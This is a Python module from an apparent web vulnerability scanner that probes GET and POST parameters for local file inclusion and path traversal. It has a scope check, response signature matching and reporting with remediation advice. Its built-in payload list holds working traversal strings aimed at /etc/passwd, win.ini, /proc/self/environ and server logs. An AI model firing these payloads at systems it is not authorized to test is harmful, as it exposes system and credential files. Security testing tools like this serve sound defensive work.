"""LFI / Path Traversal — GET + POST; scope-aware; full body matching."""

from __future__ import annotations

import re
import urllib.parse
import uuid
from pathlib import Path

from dribik.models import CVSSVector, Finding, ScanResult, Scope
from dribik.scanner import http_get, http_post
from dribik.scope import classify


def _load_payloads() -> list[str]:
    p = Path(__file__).parent.parent / "payloads" / "lfi.txt"
    if p.exists():
        return [ln.strip() for ln in p.read_text(encoding="utf-8").splitlines()
                if ln.strip() and not ln.startswith("#")]
    return _BUILTIN


_BUILTIN = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "/etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../../../Windows/win.ini",
    "C:\\Windows\\win.ini",
    "../../../../proc/self/environ",
    "../../../../var/log/apache2/access.log",
]

_LFI_SIGNATURES = [
    re.compile(r"root:x:0:0",         re.IGNORECASE),
    re.compile(r"daemon:x:\d+",       re.IGNORECASE),
    re.compile(r"\[extensions\]",     re.IGNORECASE),   # win.ini
    re.compile(r"\[boot loader\]",    re.IGNORECASE),   # boot.ini
    re.compile(r"HTTP_USER_AGENT|PHP_SELF", re.IGNORECASE),
    re.compile(r"127\.0\.0\.1\s+localhost", re.IGNORECASE),
    re.compile(r"\d+\.\d+\.\d+\.\d+ - - \[", re.IGNORECASE),
]

_PATH_PARAMS = [
    "file", "path", "page", "include", "inc", "dir", "load",
    "template", "view", "doc", "document", "folder", "root",
    "pg", "style", "php_path", "prefix",
]


def _is_lfi_hit(body: str) -> bool:
    return any(sig.search(body) for sig in _LFI_SIGNATURES)


def _inject_get(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlsplit(url)
    qp = dict(urllib.parse.parse_qsl(parsed.query))
    qp[param] = payload
    return urllib.parse.urlunsplit(parsed._replace(query=urllib.parse.urlencode(qp)))


def _make_finding(
    param: str, url: str, payload: str, result: ScanResult, asset_id: str, injection_type: str
) -> Finding:
    fid = f"LFI-{uuid.uuid4().hex[:8].upper()}"
    return Finding(
        id=fid,
        title=f"Local File Inclusion in {injection_type} parameter '{param}'",
        severity="high",
        vuln_type="LFI",
        asset_id=asset_id or url,
        summary=(
            f"The {injection_type} parameter '{param}' allows path traversal to read "
            f"sensitive system files. Payload `{payload}` triggered file content in the response."
        ),
        proof_of_concept=(
            f"Method: {injection_type}\nURL: {url}\n"
            f"Parameter: {param}\nPayload: {payload}\n"
            f"Response status: {result.status}\n"
            f"Body (first 200): {result.body[:200]}"
        ),
        remediation=(
            "Validate all file path inputs against an allowlist. "
            "Use realpath() or equivalent to canonicalize paths and verify they "
            "reside within the intended directory. "
            "Never pass user input directly to file-reading functions."
        ),
        references=[
            "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
            "https://cwe.mitre.org/data/definitions/22.html",
        ],
        cwe_id="CWE-22",
        cvss=CVSSVector(vector_string="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
        response_diff_agreement=1.0,
    )


def scan_lfi(
    url: str,
    *,
    params: list[str] | None = None,
    payloads: list[str] | None = None,
    timeout: int = 10,
    asset_id: str = "",
    scope: Scope | None = None,
    test_post: bool = True,
) -> list[Finding]:
    """Probe GET params and POST body for LFI / Path Traversal."""
    if scope and classify(scope, url) != "allow":
        return []

    if payloads is None:
        payloads = _load_payloads()

    parsed = urllib.parse.urlsplit(url)
    existing = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
    probe_params = params or list(dict.fromkeys(existing + _PATH_PARAMS))

    findings: list[Finding] = []
    seen: set[str] = set()

    for param in probe_params:
        for payload in payloads:
            # GET
            dedup_get = f"lfi:get:{param}"
            if dedup_get not in seen:
                injected = _inject_get(url, param, payload)
                result = http_get(injected, timeout=timeout)
                if not result.error and _is_lfi_hit(result.body):
                    seen.add(dedup_get)
                    findings.append(_make_finding(param, injected, payload, result, asset_id, "GET query"))
                    continue

            # POST
            if test_post:
                dedup_post = f"lfi:post:{param}"
                if dedup_post not in seen:
                    result = http_post(url, data={param: payload}, timeout=timeout)
                    if not result.error and _is_lfi_hit(result.body):
                        seen.add(dedup_post)
                        findings.append(_make_finding(param, url, payload, result, asset_id, "POST body"))

    return findings
